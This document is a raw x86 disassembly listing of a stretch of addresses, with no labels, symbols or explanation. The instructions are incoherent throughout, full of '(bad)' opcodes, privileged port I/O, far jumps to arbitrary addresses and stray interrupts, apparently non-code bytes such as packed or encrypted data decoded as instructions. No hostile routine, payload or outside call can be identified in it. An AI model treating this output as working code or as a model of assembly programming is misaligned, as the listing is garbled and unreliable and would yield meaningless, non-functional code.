  41d156:	mov    al,0x4c
  41d158:	or     ecx,DWORD PTR [edx-0x6f]
  41d15b:	sbb    DWORD PTR es:[ecx-0x52dada16],ebp
  41d162:	sub    eax,0x10bcc92e
  41d167:	in     al,0xda
  41d169:	or     BYTE PTR [edx+0x4d4d0d01],bh
  41d16f:	mov    dl,0x7b
  41d171:	push   edi
  41d172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d173:	ins    DWORD PTR es:[edi],dx
  41d174:	leave  
  41d175:	xor    eax,0xdfbd242f
  41d17a:	or     DWORD PTR [edx],ebx
  41d17c:	sub    DWORD PTR ds:0xeb8c2f83,eax
  41d182:	idiv   DWORD PTR [ebx-0x47]
  41d185:	add    DWORD PTR [esi],0x1
  41d188:	dec    ebp
  41d189:	loope  0x41d132
  41d18b:	pop    edi
  41d18c:	dec    eax
  41d18d:	jg     0x41d14d
  41d18f:	jb     0x41d1ec
  41d191:	aas    
  41d192:	jae    0x41d1bb
  41d194:	and    al,0x5
  41d196:	mov    eax,ds:0x8934bc14
  41d19b:	mov    eax,ds:0xd917e841
  41d1a0:	sub    bh,0xf3
  41d1a3:	or     eax,DWORD PTR [ebp+0x6b]
  41d1a6:	adc    al,0x6f
  41d1a8:	pop    ebp
  41d1a9:	xchg   DWORD PTR [ebp+0x12],ebp
  41d1ac:	xchg   BYTE PTR [eax+ebp*8],bh
  41d1af:	mov    ah,0x63
  41d1b1:	lods   eax,DWORD PTR ds:[esi]
  41d1b2:	daa    
  41d1b3:	xchg   esi,eax
  41d1b4:	mov    al,0x43
  41d1b6:	sbb    esi,DWORD PTR [esi]
  41d1b8:	push   edi
  41d1b9:	jo     0x41d1cb
  41d1bb:	in     eax,0x91
  41d1bd:	je     0x41d155
  41d1bf:	clc    
  41d1c0:	xor    eax,0x6ca0d540
  41d1c5:	shl    ebx,0x8f
  41d1c8:	xchg   edx,edx
  41d1ca:	mov    cl,0x5d
  41d1cc:	jle    0x41d218
  41d1ce:	cld    
  41d1cf:	sub    edx,DWORD PTR [esi-0x3b]
  41d1d2:	sbb    eax,DWORD PTR [ecx]
  41d1d4:	js     0x41d17a
  41d1d6:	ss ds pop esi
  41d1d9:	push   edx
  41d1da:	loope  0x41d243
  41d1dc:	jmp    0x41d1b0
  41d1de:	and    edi,DWORD PTR [eax+0x31438cc1]
  41d1e4:	pop    esp
  41d1e5:	test   eax,0xeb241cdb
  41d1ea:	retf   0x83b1
  41d1ed:	lods   eax,DWORD PTR ds:[esi]
  41d1ee:	loop   0x41d1b6
  41d1f0:	jo     0x41d1b4
  41d1f2:	xor    eax,0x11ac0213
  41d1f7:	ins    DWORD PTR es:[edi],dx
  41d1f8:	fadd   QWORD PTR [ebx]
  41d1fa:	add    DWORD PTR [eax],ebx
  41d1fc:	int    0xef
  41d1fe:	jl     0x41d269
  41d200:	push   esp
  41d201:	sar    BYTE PTR [edi+0x752e8ed0],1
  41d207:	mov    ch,0xcf
  41d209:	(bad)  
  41d20a:	pop    esp
  41d20b:	rcr    ch,cl
  41d20d:	inc    ebp
  41d20e:	in     eax,0xda
  41d210:	inc    eax
  41d211:	push   eax
  41d212:	inc    esp
  41d213:	and    DWORD PTR [ecx+0x2bc64f39],eax
  41d219:	aam    0xe1
  41d21b:	(bad)  
  41d21c:	popa   
  41d21d:	xor    al,0x4d
  41d21f:	fs sti 
  41d221:	push   ebp
  41d222:	cmp    esi,DWORD PTR ds:0xd1576230
  41d228:	(bad)  
  41d22a:	xchg   esi,eax
  41d22b:	push   0xffffffa0
  41d22d:	nop
  41d22e:	repnz loop 0x41d1d1
  41d231:	and    ecx,DWORD PTR [edi]
  41d233:	stos   DWORD PTR es:[edi],eax
  41d234:	int    0xce
  41d236:	nop
  41d237:	iret   
  41d238:	inc    ebp
  41d239:	mov    ds:0x95c13db7,eax
  41d23e:	mov    dh,0xf0
  41d240:	scas   al,BYTE PTR es:[edi]
  41d241:	retf   0xf3a6
  41d244:	cdq    
  41d245:	sbb    BYTE PTR [ebx+0x9a982a7],bl
  41d24b:	ins    DWORD PTR es:[edi],dx
  41d24c:	xchg   ecx,eax
  41d24d:	(bad)  
  41d24e:	aaa    
  41d24f:	jns    0x41d233
  41d251:	add    DWORD PTR [ebx+0x68],esi
  41d254:	(bad)  
  41d255:	and    eax,0x74317c75
  41d25a:	adc    bh,ah
  41d25c:	ret    0x454a
  41d25f:	xor    DWORD PTR [eax+ebp*4+0x65],0x3
  41d264:	cs call 0x3e8ce347
  41d26a:	mov    esi,0xfb0a2b3
  41d26f:	cli    
  41d270:	dec    ebx
  41d271:	cld    
  41d272:	xchg   esp,eax
  41d273:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d274:	idiv   dh
  41d276:	arpl   WORD PTR [esi+0x265df978],dx
  41d27c:	(bad)  
  41d27d:	cmp    eax,0xae89e9b0
  41d282:	dec    edx
  41d283:	xchg   DWORD PTR [ecx+0x2f74a732],ebp
  41d289:	sbb    esp,DWORD PTR [esp-0x26]
  41d28d:	in     eax,dx
  41d28e:	ret    
  41d28f:	cld    
  41d290:	es push ds
  41d292:	add    edx,esi
  41d294:	mov    edx,0xc18b56e4
  41d299:	mov    ebx,ebx
  41d29b:	add    BYTE PTR [edx],bh
  41d29d:	loopne 0x41d295
  41d29f:	push   ebx
  41d2a0:	cmp    ah,cl
  41d2a2:	mov    WORD PTR [edx-0x755ec0d3],ss
  41d2a8:	pop    esp
  41d2a9:	sbb    BYTE PTR [eax],dl
  41d2ab:	and    eax,0x711c61f4
  41d2b0:	fistp  QWORD PTR [edi]
  41d2b2:	idiv   DWORD PTR [eax]
  41d2b4:	xchg   esp,eax
  41d2b5:	mov    ah,0x21
  41d2b7:	sahf   
  41d2b8:	pop    ebx
  41d2b9:	push   cs
  41d2ba:	jno    0x41d2c2
  41d2bc:	adc    eax,0xdd35c6f2
  41d2c1:	arpl   cx,si
  41d2c3:	mov    esi,DWORD PTR [esi+eiz*4+0x16]
  41d2c7:	pop    es
  41d2c8:	(bad)  
  41d2c9:	mov    edx,0x1076ae47
  41d2ce:	stos   DWORD PTR es:[edi],eax
  41d2cf:	call   0x8ed94c67
  41d2d4:	pop    ss
  41d2d5:	cdq    
  41d2d6:	jl     0x41d25a
  41d2d8:	mov    eax,0x2a635c1a
  41d2dd:	mov    bl,0xf6
  41d2df:	call   0x770ae435
  41d2e4:	add    ebp,0x23f40d34
  41d2ea:	xor    ah,bl
  41d2ec:	fbld   TBYTE PTR [edx-0x25]
  41d2ef:	push   esp
  41d2f0:	in     eax,dx
  41d2f1:	xchg   edi,eax
  41d2f2:	shr    DWORD PTR [ecx+0x7e71a240],1
  41d2f8:	call   0x31cd:0x3bcf3b0e
  41d2ff:	mov    esi,0x5687fbec
  41d304:	add    al,0xf0
  41d306:	pop    edx
  41d307:	scas   eax,DWORD PTR es:[edi]
  41d308:	jge    0x41d2f2
  41d30a:	sbb    BYTE PTR [edx+0x78],dl
  41d30d:	lock outs dx,DWORD PTR ds:[esi]
  41d30f:	sub    eax,0xc754dc93
  41d314:	xchg   ebx,eax
  41d315:	fld    st(5)
  41d317:	pop    esp
  41d318:	pop    esp
  41d319:	cmp    eax,0xa16a6148
  41d31e:	test   al,0xd6
  41d320:	jmp    0xd2d:0x1960f938
  41d327:	dec    eax
  41d328:	and    eax,0xab0ba19
  41d32d:	lock popf 
  41d32f:	xor    esi,DWORD PTR [eax+0x620160f2]
  41d335:	add    eax,0x791e32e1
  41d33a:	(bad)  [esi*8-0x85941f6]
  41d341:	fadd   st(2),st
  41d343:	jmp    0x41d31e
  41d345:	ret    
  41d346:	mov    ds:0xc237577e,al
  41d34b:	xor    BYTE PTR [edi-0x42c78c3],cl
  41d351:	push   esp
  41d352:	fwait
  41d353:	popa   
  41d354:	xchg   DWORD PTR [ebp-0x79],esi
  41d357:	dec    edx
  41d358:	mov    ah,ah
  41d35a:	sbb    al,0x61
  41d35c:	and    BYTE PTR [ebx],dh
  41d35e:	pop    es
  41d35f:	pop    ds
  41d360:	mov    eax,ds:0x861a56c6
  41d365:	shr    edi,1
  41d367:	hlt    
  41d368:	xchg   esp,eax
  41d369:	sub    DWORD PTR [ecx+ecx*4],edi
  41d36c:	mov    al,0x4b
  41d36e:	cmp    al,0x10
  41d370:	xchg   esi,eax
  41d371:	add    ecx,ebp
  41d373:	jge    0x41d340
  41d375:	or     dl,cl
  41d377:	or     BYTE PTR [edi],bh
  41d379:	mov    edi,0x9e04eb3d
  41d37e:	cmp    BYTE PTR [ebp+0x79],dl
  41d381:	pop    esi
  41d382:	xchg   ebx,eax
  41d383:	aad    0xc7
  41d385:	leave  
  41d386:	jecxz  0x41d3bb
  41d388:	dec    ecx
  41d389:	cmp    edi,DWORD PTR [esi+edi*8]
  41d38c:	cmp    ecx,DWORD PTR [edi+0x7532cc57]
  41d392:	das    
  41d393:	mov    cl,BYTE PTR [eax+0x3c7a1375]
  41d399:	mov    cl,0x32
  41d39b:	push   es
  41d39c:	outs   dx,BYTE PTR ds:[esi]
  41d39d:	push   0x45226864
  41d3a2:	retf   
  41d3a3:	loope  0x41d373
  41d3a5:	(bad)  
  41d3a6:	sbb    dl,ch
  41d3a8:	mov    ds:0x31b08816,al
  41d3ad:	adc    DWORD PTR [esi-0x586fe5dd],edx
  41d3b3:	(bad)  
  41d3b4:	jmp    0xe49eb6ff
  41d3b9:	loopne 0x41d376
  41d3bb:	and    BYTE PTR [ecx-0x73bd76aa],dh
  41d3c1:	xchg   ebx,eax
  41d3c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3c3:	xchg   ebp,eax
  41d3c4:	sti    
  41d3c5:	xor    eax,0x9564b722
  41d3ca:	cmova  ebp,eax
  41d3cd:	inc    esp
  41d3ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3cf:	mov    ?,WORD PTR [esi]
  41d3d1:	int3   
  41d3d2:	repnz mov bl,0x30
  41d3d5:	mov    eax,ds:0xa5e95324
  41d3da:	aaa    
  41d3db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3dc:	jle    0x41d3ba
  41d3de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3df:	jmp    0xbf64:0x181deb7f
  41d3e6:	or     ch,BYTE PTR [edi+0x5]
  41d3e9:	in     al,dx
  41d3ea:	add    al,0x1c
  41d3ec:	jp     0x41d414
  41d3ee:	ss call 0x2eef:0xb1c918fa
  41d3f6:	mov    esi,0x1e97c9fa
  41d3fb:	out    0xc8,al
  41d3fd:	fild   QWORD PTR [ecx-0x65]
  41d400:	loopne 0x41d46b
  41d402:	mov    WORD PTR [edi],ss
  41d404:	xchg   dl,cl
  41d406:	cdq    
  41d407:	int    0x3d
  41d409:	sbb    BYTE PTR [ecx+edx*1+0x1e],0x8d
  41d40e:	push   ebx
  41d40f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d410:	xlat   BYTE PTR ds:[ebx]
  41d411:	dec    esp
  41d412:	add    ebx,DWORD PTR [ebp+0x5641fa2f]
  41d418:	inc    eax
  41d419:	cli    
  41d41a:	cmp    DWORD PTR [edi],ecx
  41d41c:	add    ebp,DWORD PTR [edx+0x77]
  41d41f:	push   edi
  41d420:	cmp    al,0x15
  41d422:	cmp    bl,BYTE PTR [edi+0x250b3c3d]
  41d428:	(bad)  
  41d429:	push   eax
  41d42a:	aaa    
  41d42b:	or     eax,DWORD PTR [edx-0x2]
  41d42e:	out    dx,al
  41d42f:	xor    al,0x9d
  41d431:	adc    edx,edx
  41d433:	xchg   edi,eax
  41d434:	or     eax,0x2d153b31
  41d439:	adc    eax,0xc937fbd6
  41d43e:	or     dh,BYTE PTR [edi+0x1b]
  41d441:	scas   al,BYTE PTR es:[edi]
  41d442:	dec    ebx
  41d443:	mov    ds:0xf4c0064d,eax
  41d448:	pop    ss
  41d449:	jne    0x41d3d4
  41d44b:	push   0xa0c006b2
  41d450:	fs in  eax,dx
  41d452:	mov    DWORD PTR [eax+0x19],edx
  41d455:	inc    edx
  41d456:	cmc    
  41d457:	outs   dx,BYTE PTR ds:[esi]
  41d458:	xor    al,0x64
  41d45a:	add    eax,0x354e025c
  41d45f:	push   0x63b32906
  41d464:	jle    0x41d44a
  41d466:	pop    es
  41d467:	add    al,BYTE PTR [eax+eiz*1-0x785ae721]
  41d46e:	xchg   DWORD PTR [esi-0xff1e6f0],edi
  41d474:	aaa    
  41d475:	and    eax,0x2a31088b
  41d47a:	jbe    0x41d43b
  41d47c:	out    dx,eax
  41d47d:	leave  
  41d47e:	xchg   BYTE PTR [ebp+0x12],dh
  41d481:	inc    ecx
  41d482:	xor    ch,BYTE PTR [edx+0x2c]
  41d485:	inc    ecx
  41d486:	mov    esp,es
  41d488:	xchg   edi,eax
  41d489:	shl    BYTE PTR [edi+eiz*4],0x93
  41d48d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d48e:	ror    BYTE PTR [ecx+0x204418fa],0xbb
  41d495:	xchg   edi,eax
  41d496:	stc    
  41d497:	daa    
  41d498:	fist   WORD PTR [ebp-0x9]
  41d49b:	cs sbb eax,edx
  41d49e:	(bad)  
  41d4a0:	cs push ecx
  41d4a2:	btc    DWORD PTR [ecx+0x3a],esi
  41d4a6:	lds    edi,FWORD PTR [esi+0x33]
  41d4a9:	stos   BYTE PTR es:[edi],al
  41d4aa:	ins    BYTE PTR es:[edi],dx
  41d4ab:	cmp    BYTE PTR [eax+0x7890b0a9],ah
  41d4b1:	nop
  41d4b2:	push   ebx
  41d4b3:	push   cs
  41d4b4:	aas    
  41d4b5:	aad    0x3
  41d4b7:	scas   al,BYTE PTR es:[edi]
  41d4b8:	out    0x5,al
  41d4ba:	call   0xa009:0xc773b46f
  41d4c1:	mov    eax,0xcc7e8f63
  41d4c6:	ja     0x41d507
  41d4c8:	imul   esp,DWORD PTR [ecx],0xffffff81
  41d4cb:	xchg   edi,eax
  41d4cc:	mov    ecx,0x8c306366
  41d4d1:	xchg   ebp,eax
  41d4d2:	push   0x4f
  41d4d4:	sbb    ecx,edi
  41d4d6:	jle    0x41d4e3
  41d4d8:	imul   ebx,DWORD PTR [edx+0x52],0x22b87540
  41d4df:	mov    bl,0x77
  41d4e1:	inc    esi
  41d4e2:	loop   0x41d518
  41d4e4:	je     0x41d4a1
  41d4e6:	pusha  
  41d4e7:	and    eax,0x90951c8d
  41d4ec:	and    bl,BYTE PTR [eax+0x5e6a2de2]
  41d4f2:	leave  
  41d4f3:	xor    dh,BYTE PTR [ebp+0x21]
  41d4f6:	add    edx,esi
  41d4f8:	(bad)  
  41d4fa:	nop
  41d4fb:	mov    ds,WORD PTR [eax+0x37]
  41d4fe:	push   edi
  41d4ff:	ss or  al,0xed
  41d502:	fs ja  0x41d4f1
  41d505:	or     BYTE PTR [edi],ch
  41d507:	jb     0x41d498
  41d509:	test   DWORD PTR [eax+0x35],ecx
  41d50c:	pop    ecx
  41d50d:	dec    edi
  41d50e:	int    0x79
  41d510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d511:	mov    BYTE PTR [esi-0x36],ch
  41d514:	mov    bh,0x49
  41d516:	scas   al,BYTE PTR es:[edi]
  41d517:	outs   dx,BYTE PTR ds:[esi]
  41d518:	pushf  
  41d519:	test   BYTE PTR [edx+edx*8],ch
  41d51c:	mov    al,0x21
  41d51e:	lds    esp,FWORD PTR [ecx+0x65fe90d5]
  41d524:	jno    0x41d4ee
  41d526:	mov    eax,0xc72a410d
  41d52b:	inc    ebx
  41d52c:	sti    
  41d52d:	add    dh,BYTE PTR [ebx]
  41d52f:	push   cs
  41d530:	sub    ebx,DWORD PTR [ebp+ecx*8+0x77]
  41d534:	sahf   
  41d535:	mov    ds:0xfd97db41,al
  41d53a:	dec    ecx
  41d53b:	neg    DWORD PTR [edi+eax*2-0x22]
  41d53f:	jmp    0x68f61143
  41d544:	push   eax
  41d545:	(bad)  
  41d546:	jecxz  0x41d4f2
  41d548:	and    eax,0x80c94acf
  41d54d:	jne    0x41d524
  41d54f:	push   edx
  41d550:	fs adc eax,0x254a56d0
  41d556:	push   ds
  41d557:	aaa    
  41d558:	adc    al,0x1f
  41d55a:	cmp    al,0x82
  41d55c:	clc    
  41d55d:	icebp  
  41d55e:	fcomp  DWORD PTR [ebp-0x2ac95466]
  41d564:	or     BYTE PTR [ebx-0x7ac3377],cl
  41d56a:	mov    al,0x14
  41d56c:	mov    al,ds:0x4e732ccb
  41d571:	in     eax,dx
  41d572:	mov    al,BYTE PTR [eax+ecx*4-0x4bd03667]
  41d579:	(bad)  
  41d57a:	daa    
  41d57b:	and    al,0xf
  41d57d:	jp     0x41d589
  41d57f:	pop    edi
  41d580:	mov    al,0x68
  41d582:	push   0xba2a7c19
  41d587:	mov    esp,0xf8e6a5e0
  41d58c:	push   esi
  41d58d:	adc    ah,ch
  41d58f:	and    eax,0x7ad66c1a
  41d594:	cmc    
  41d595:	mov    eax,ds:0x9822dd19
  41d59a:	or     eax,0x9cf319ef
  41d59f:	mov    al,ds:0x59e310ee
  41d5a4:	jg     0x41d590
  41d5a6:	inc    edx
  41d5a7:	mov    ds:0xadb6ba39,eax
  41d5ac:	jmp    0x9600:0x4c10a7cd
  41d5b3:	sti    
  41d5b4:	repz leave 
  41d5b6:	sub    dh,BYTE PTR [ebx]
  41d5b8:	mov    edi,0xd143c14b
  41d5bd:	call   0xf462:0xffe115a
  41d5c4:	repnz mov ah,0x63
  41d5c7:	sub    al,0xce
  41d5c9:	add    edi,esp
  41d5cb:	and    ax,0x9a7f
  41d5cf:	daa    
  41d5d0:	xor    eax,0xab47d463
  41d5d5:	jl     0x41d60d
  41d5d7:	sar    DWORD PTR [edx-0x19d4e436],0xdb
  41d5de:	xchg   esi,eax
  41d5df:	ins    BYTE PTR es:[edi],dx
  41d5e0:	popf   
  41d5e1:	jmp    0x41d58f
  41d5e3:	outs   dx,BYTE PTR ds:[esi]
  41d5e4:	imul   edi,DWORD PTR [edi+0x23],0x4f
  41d5e8:	es or  al,0x12
  41d5eb:	pop    edi
  41d5ec:	adc    esi,DWORD PTR [esi]
  41d5ee:	std    
  41d5ef:	adc    al,0x44
  41d5f1:	(bad)  
  41d5f3:	js     0x41d66f
  41d5f5:	ja     0x41d5f0
  41d5f7:	and    BYTE PTR [ebx+0x36],bl
  41d5fa:	cmp    DWORD PTR [ebx+esi*8+0x34b2b16f],esi
  41d601:	push   0x1c
  41d603:	xchg   edx,eax
  41d604:	in     eax,dx
  41d605:	pop    edi
  41d606:	push   ebx
  41d607:	pop    esi
  41d608:	or     DWORD PTR [ebx+eax*8],edi
  41d60b:	push   0x25d23ca
  41d610:	push   ecx
  41d611:	lahf   
  41d612:	adc    cl,BYTE PTR [esi]
  41d614:	cdq    
  41d615:	(bad)  
  41d616:	push   ebx
  41d617:	aaa    
  41d618:	cmp    eax,ebx
  41d61a:	(bad)  
  41d61c:	xchg   ch,ah
  41d61e:	jl     0x41d635
  41d620:	or     BYTE PTR [edi],cl
  41d622:	push   edx
  41d623:	dec    esp
  41d624:	push   cs
  41d625:	sbb    BYTE PTR [ebx-0x62],al
  41d628:	inc    ebx
  41d629:	mov    ds:0x2945d055,eax
  41d62e:	push   esi
  41d62f:	scas   al,BYTE PTR es:[edi]
  41d630:	test   BYTE PTR [esi+0x53cdd9a6],cl
  41d636:	(bad)  
  41d638:	or     DWORD PTR [edx-0x5861f8b0],eax
  41d63e:	gs mov edx,0xa98affba
  41d644:	adc    DWORD PTR fs:[edi],esp
  41d647:	popa   
  41d648:	jp     0x41d6ae
  41d64a:	mov    dl,0xb1
  41d64c:	not    DWORD PTR [eax]
  41d64e:	pushf  
  41d64f:	inc    esp
  41d650:	or     DWORD PTR [edi+0x808a972],ebx
  41d656:	adc    BYTE PTR [ecx+0x5ff39d37],cl
  41d65c:	sar    BYTE PTR [eax+eax*4-0x31],cl
  41d660:	mov    edx,0x720fe2eb
  41d665:	out    dx,al
  41d666:	cmp    bl,BYTE PTR [ebx-0x40bbcce1]
  41d66c:	sbb    eax,0x5fa221ba
  41d671:	or     cl,dl
  41d673:	xlat   BYTE PTR ds:[ebx]
  41d674:	jnp    0x41d6db
  41d676:	jle    0x41d669
  41d678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d679:	adc    BYTE PTR [edi+ecx*2+0x1a],ah
  41d67d:	sub    ecx,ebp
  41d67f:	and    esp,edi
  41d681:	stc    
  41d682:	mov    ds:0x351ee5d,al
  41d687:	or     esp,edx
  41d689:	push   ebp
  41d68a:	inc    edx
  41d68b:	or     BYTE PTR [ebx],dh
  41d68d:	or     DWORD PTR [edx-0xfcbeb32],esi
  41d693:	in     eax,0xb7
  41d695:	in     al,dx
  41d696:	inc    edx
  41d697:	or     bl,BYTE PTR [eax]
  41d699:	push   eax
  41d69a:	sbb    BYTE PTR [edx],0x57
  41d69d:	xchg   edx,eax
  41d69e:	mov    bh,BYTE PTR [ecx-0x31]
  41d6a1:	xchg   esi,eax
  41d6a2:	cs dec edx
  41d6a4:	inc    ebx
  41d6a5:	loope  0x41d67e
  41d6a7:	(bad)
  41d6aa:	cli    
  41d6ab:	sub    al,0x3d
  41d6ad:	mov    eax,ds:0xf3709818
  41d6b2:	lods   al,BYTE PTR ds:[esi]
  41d6b3:	cmp    dl,bh
  41d6b5:	adc    eax,ebx
  41d6b7:	scas   al,BYTE PTR es:[edi]
  41d6b8:	xchg   edx,eax
  41d6b9:	xchg   DWORD PTR [eax+0x6c],ebx
  41d6bc:	inc    ecx
  41d6bd:	daa    
  41d6be:	xchg   ebx,eax
  41d6bf:	or     ah,BYTE PTR [edi+0x7edca946]
  41d6c5:	fdivr  QWORD PTR [edi+0x24]
  41d6c8:	loope  0x41d6cc
  41d6ca:	fucomp st(0)
  41d6cc:	rol    ch,cl
  41d6ce:	sub    edx,edx
  41d6d0:	dec    esi
  41d6d1:	popf   
  41d6d2:	fwait
  41d6d3:	ja     0x41d655
  41d6d5:	xor    DWORD PTR ds:0x7920cba9,edi
  41d6db:	fld    DWORD PTR [ebx-0x37]
  41d6de:	in     al,0xa1
  41d6e0:	cmovle edx,DWORD PTR [edx]
  41d6e3:	es stos DWORD PTR es:[edi],eax
  41d6e5:	pop    ds
  41d6e6:	out    dx,eax
  41d6e7:	jle    0x41d6f1
  41d6e9:	adc    DWORD PTR [ebx-0x1712d93c],0xac9f1324
  41d6f3:	mov    edi,0x6832acbd
  41d6f8:	mov    ebx,DWORD PTR [esi+esi*4-0x43dafdf2]
  41d6ff:	call   0xa88907b3
  41d704:	sub    al,0xb1
  41d706:	sub    DWORD PTR [ecx+0x367aad8d],esi
  41d70c:	jns    0x41d748
  41d70e:	mov    al,ds:0x65cc2dea
  41d713:	lea    esi,[eax+0x65ba7053]
  41d719:	adc    eax,0xb9600a7c
  41d71e:	je     0x41d6e3
  41d720:	js     0x41d758
  41d722:	fstp   DWORD PTR fs:[edx+0x1af05efe]
  41d729:	dec    eax
  41d72a:	leave  
  41d72b:	mov    eax,0xcb0f9784
  41d730:	lahf   
  41d731:	call   0x1a9:0xec2582b
  41d738:	push   esi
  41d739:	mov    ebx,0x568ffacd
  41d73e:	push   ebx
  41d73f:	xrelease mov BYTE PTR [ebx],dl
  41d742:	sub    ch,dh
  41d744:	lods   eax,DWORD PTR ds:[esi]
  41d745:	mov    al,0x29
  41d747:	sbb    ebx,DWORD PTR [ebx+0x40bdb4b5]
  41d74d:	mov    ebx,0x185e99cc
  41d752:	enter  0x795,0x25
  41d756:	or     BYTE PTR [edi-0x33],dh
  41d759:	int    0x3e
  41d75b:	push   edx
  41d75c:	hlt    
  41d75d:	push   edi
  41d75e:	pop    DWORD PTR [eax+edi*8-0xf]
  41d762:	fwait
  41d763:	stos   DWORD PTR es:[edi],eax
  41d764:	xchg   ecx,eax
  41d765:	pop    eax
  41d766:	adc    DWORD PTR [edi+0xd],esp
  41d769:	js     0x41d7a0
  41d76b:	adc    esp,ecx
  41d76d:	call   0xf8a:0x13d9c0b0
  41d774:	inc    esp
  41d775:	test   eax,0x36fc3a37
  41d77a:	sahf   
  41d77b:	pop    ebx
  41d77c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d77d:	mov    ds:0x5f76aab7,eax
  41d782:	in     al,dx
  41d783:	lds    ebx,FWORD PTR [ebx-0x5a]
  41d786:	and    eax,0xaeaf7f33
  41d78b:	iret   
  41d78c:	jle    0x41d790
  41d78e:	dec    ebx
  41d78f:	sbb    esi,DWORD PTR [edx+edx*8-0x1a0edcf0]
  41d796:	push   ss
  41d797:	in     eax,0xef
  41d799:	cmp    bl,BYTE PTR [edx+0xc]
  41d79c:	pop    eax
  41d79d:	mov    esp,0x1abb7800
  41d7a2:	inc    ecx
  41d7a3:	cmp    bh,al
  41d7a5:	dec    edi
  41d7a6:	or     DWORD PTR [edx+0x73],eax
  41d7a9:	ja     0x41d7f9
  41d7ab:	inc    ebx
  41d7ac:	leave  
  41d7ad:	mov    edx,0xa124783a
  41d7b2:	inc    ebp
  41d7b3:	popf   
  41d7b4:	xchg   ebx,eax
  41d7b5:	push   ebx
  41d7b6:	push   ebp
  41d7b7:	je     0x41d7b9
  41d7b9:	(bad)  
  41d7ba:	jmp    0x41d771
  41d7bc:	mov    dl,0x99
  41d7be:	xchg   edi,eax
  41d7bf:	dec    esi
  41d7c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7c1:	xor    BYTE PTR [ebx-0x14],cl
  41d7c4:	push   0x4fda23d
  41d7c9:	(bad)  
  41d7ca:	hlt    
  41d7cb:	arpl   WORD PTR [edi-0x5e14dbf9],sp
  41d7d1:	xchg   ebx,eax
  41d7d2:	lahf   
  41d7d3:	sbb    DWORD PTR [edx-0x16],0x6d
  41d7d7:	repz mov bl,0xd5
  41d7da:	out    0x31,eax
  41d7dc:	addr16 jp 0x41d765
  41d7df:	pushf  
  41d7e0:	inc    esp
  41d7e1:	dec    edi
  41d7e2:	mov    dl,0x1b
  41d7e4:	add    DWORD PTR [edx+0x15],0xfffffffc
  41d7e8:	inc    edi
  41d7e9:	mov    edx,0xb025ecbd
  41d7ee:	or     BYTE PTR [esi+0x11],bh
  41d7f1:	add    DWORD PTR [edx-0x2e],0xd34d8ffb
  41d7f8:	push   edx
  41d7f9:	jns    0x41d848
  41d7fb:	rcl    eax,0x57
  41d7fe:	pop    eax
  41d7ff:	jge    0x41d7f8
  41d801:	adc    ch,BYTE PTR [esi]
  41d803:	repz add al,0x8f
  41d806:	xlat   BYTE PTR ds:[ebx]
  41d807:	test   BYTE PTR [edi+0x7b1b1685],al
  41d80d:	aam    0x51
  41d80f:	xor    BYTE PTR [ebx],bl
  41d811:	sti    
  41d812:	(bad)  
  41d813:	push   ecx
  41d814:	mov    BYTE PTR [ecx],0x94
  41d817:	test   BYTE PTR [edx+ebx*1-0x5f228174],0x34
  41d81f:	rcl    DWORD PTR ds:[edx],0x64
  41d823:	xor    al,0x2d
  41d825:	in     eax,dx
  41d826:	(bad)  [ecx]
  41d828:	sbb    BYTE PTR [bx+si+0x405a],bh
  41d82d:	cmp    al,0xf3
  41d82f:	dec    esp
  41d830:	icebp  
  41d831:	pop    edi
  41d832:	fwait
  41d833:	aam    0x49
  41d835:	sqrtps xmm0,XMMWORD PTR [edx+edi*4+0x47a6e0a9]
  41d83d:	mov    ds:0x1045719b,eax
  41d842:	jecxz  0x41d7da
  41d844:	mov    bl,0xe2
  41d846:	std    
  41d847:	push   esi
  41d848:	mov    cl,0x13
  41d84a:	mov    ds,edx
  41d84c:	test   DWORD PTR [ebx+edi*1],ebp
  41d84f:	cmp    ebx,DWORD PTR [edx-0x4374a51b]
  41d855:	push   ebp
  41d856:	jl     0x41d8af
  41d858:	(bad)  
  41d859:	(bad)  
  41d85a:	repnz adc al,0x9c
  41d85d:	sahf   
  41d85e:	jp     0x41d859
  41d860:	dec    ecx
  41d861:	neg    BYTE PTR [eax-0x3]
  41d864:	pop    es
  41d865:	xchg   ebp,eax
  41d866:	scas   al,BYTE PTR es:[edi]
  41d867:	ins    DWORD PTR es:[edi],dx
  41d868:	mov    ds:0xa81ed23c,al
  41d86d:	xchg   edx,eax
  41d86e:	pop    ecx
  41d86f:	pop    edi
  41d870:	mov    ecx,0x25f0fbb0
  41d875:	aam    0xe8
  41d877:	or     edx,DWORD PTR [edi-0x9355d8b]
  41d87d:	arpl   WORD PTR [ecx-0x41e80b12],sp
  41d883:	dec    eax
  41d884:	xchg   esi,ecx
  41d886:	lods   eax,DWORD PTR ds:[esi]
  41d887:	xor    al,0xba
  41d889:	sbb    al,0x18
  41d88b:	jnp    0x41d862
  41d88d:	shr    BYTE PTR [esi],cl
  41d88f:	pop    ebp
  41d890:	add    eax,0xc8f9b71
  41d895:	push   eax
  41d896:	adc    al,0xb8
  41d898:	or     ax,0x5066
  41d89c:	jo     0x41d900
  41d89e:	xor    al,0x19
  41d8a0:	pop    ss
  41d8a1:	outs   dx,DWORD PTR ds:[esi]
  41d8a2:	lock ficom WORD PTR [esi]
  41d8a5:	std    
  41d8a6:	jmp    0x3726:0xe4748051
  41d8ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8ae:	jne    0x41d844
  41d8b0:	js     0x41d913
  41d8b2:	cmp    DWORD PTR [ecx-0x5c2e88ac],ebp
  41d8b8:	mov    ecx,0x3815a046
  41d8bd:	sbb    ebp,DWORD PTR [ebp+0xc]
  41d8c0:	or     al,0xf3
  41d8c2:	out    0xc1,eax
  41d8c4:	jno    0x41d84c
  41d8c6:	inc    edx
  41d8c7:	push   cs
  41d8c8:	mov    eax,0x426251ae
  41d8cd:	bound  eax,QWORD PTR [eax-0x3300739e]
